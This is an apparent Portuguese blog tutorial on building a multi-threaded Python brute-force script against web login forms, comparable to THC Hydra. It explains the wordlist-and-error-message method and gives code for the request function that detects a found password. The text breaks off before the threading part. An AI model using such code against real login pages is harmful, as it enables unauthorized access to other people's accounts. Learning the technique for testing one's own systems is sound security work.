---
layout: post
title:  "Criando nosso próprio script de Brute Force"
date:   2020-10-14 18:00:00 -0300
categories: hacking
author: "ReddyyZ"
lang: pt-BR
tags: [brute force, login page, python, password cracking]
reading_time: 2 minutes
---

Neste artigo vamos aprender como criar um script de Brute Force multi-threadead, semelhante ao THC Hydra.

### Bibliotecas usadas

- requests
- argparse
- threading
- os
- time

Vamos usar a biblioteca [requests](https://requests.readthedocs.io/en/master/) para facilitar o nosso trabalho com as requisições HTTP, [argparse](https://docs.python.org/3/howto/argparse.html) para utilizarmos argumentos na linha de comando e [threading]() para usarmos vários threads que proporcionarão uma maior velocidade.

Caso não queira depender de bibliotecas, pode fazer todas as requisições na mão usando sockets.

### Como irá funcionar o script

O script receberá como argumento o usuário que deve ser testado, uma wordlist com as possíveis senhas e a mensagem de erro que é exibida quando se erra o login.

Ele percorrerá essa lista de senhas testando cada uma, e checando se a mensagem de erro é exibida, caso a mensagem de erro não apareça, a senha foi encontrada!

### Multi-Threading

O multi-threading funcionará da seguinte forma:

> Neste exemplo vamos supor que a quantidade de threads definida é 16

No script terá um `for i in range(16)` que irá obter a primeira senha da lista, remove-la, criar um thread para essa requisição e adicioná-lo a uma lista de threads.

Em seguida ele irá aguardar esses 16 threads terminarem e então repetirá este mesmo código com outras 16 senhas, até achar a senha correta ou terminar a wordlist.

### Criando o script

Agora que já entendemos como o script funcionará, vamos codar!

Primeiro importamos as bibliotecas:
```python
import requests, argparse, threading, os, time
```

E agora vamos criar a função que irá enviar a requisição

```python
def send_request(url, data, login, error_message, t_number):
    '''
    error_message = Mensagem de login errado
    data = Formulario preenchido
    login = Usuario e senha
    t_number = Numero do thread
    '''
    print(f"[Thread: {t_number}] Testing: {login[0]}:{login[1]}")
    r = requests.post(url,data=data,timeout=3)

    if not error_message in r.text:
       print(f"\nSENHA ENCONTRADA: {login[0]}:{login[1]}\n")
       os._exit(1)
```

Aqui enviamos a requisição POST e aguardamos a resposta:
```python
r = requests.post(url,data=data,timeout=3)
```
E em seguida checamos se é exibida a mensagem de erro:
```python
if not error_message in r.text:
```
Caso não seja exibida, exibimos a senha encontrada e damos um "exit" no script.
```python
print(f"\nSENHA ENCONTRADA: {login[0]}:{login[1]}\n")
os._exit(1)
```